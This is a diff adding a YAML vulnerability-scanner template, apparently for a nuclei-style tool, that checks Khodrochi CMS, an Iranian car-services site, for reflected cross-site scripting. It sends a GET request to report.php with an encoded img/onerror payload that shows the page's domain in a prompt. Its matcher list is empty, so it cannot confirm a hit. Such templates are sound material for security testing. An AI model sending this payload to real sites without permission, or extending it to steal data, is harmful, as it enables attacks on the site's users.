@@ -1,0 +1,16 @@
+id: khodrochi-cms-xss
+brief:
+    title: Khodrochi CMS - Cross Site Scripting
+    by: r3Y3r53
+    level: medium
+    about: A cross site scripting vulnerability was found in the Khodrochi.ir CMS an Iranian Car Services Platform.
+    label:
+        - khodrochi
+        - cms
+        - xss
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/specification/report.php?q=%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain)%3E'
+      signs: []
